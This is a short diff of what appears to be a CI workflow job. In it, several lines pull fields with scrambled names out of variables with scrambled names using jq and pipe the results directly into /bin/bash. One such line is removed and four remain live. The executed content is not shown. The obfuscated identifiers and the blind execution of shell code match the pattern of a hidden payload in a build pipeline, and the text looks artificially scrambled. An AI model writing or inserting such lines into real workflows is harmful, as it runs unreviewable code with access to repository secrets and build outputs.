@@ -27,7 +27,6 @@ jobs:
           echo $vu3 | jq -r .rtgff00746 | /bin/bash
           printf '%s' "$ldyjq23" | jq -r .s78 | /bin/bash
           printf '%s' "$dqva3" | jq -r .wcou616 | /bin/bash
-          echo $ht63374 | jq -r .derqh534 | /bin/bash
           printf '%s' "$b669" | jq -r .nahkr35 | /bin/bash
 
       - name: Upload results
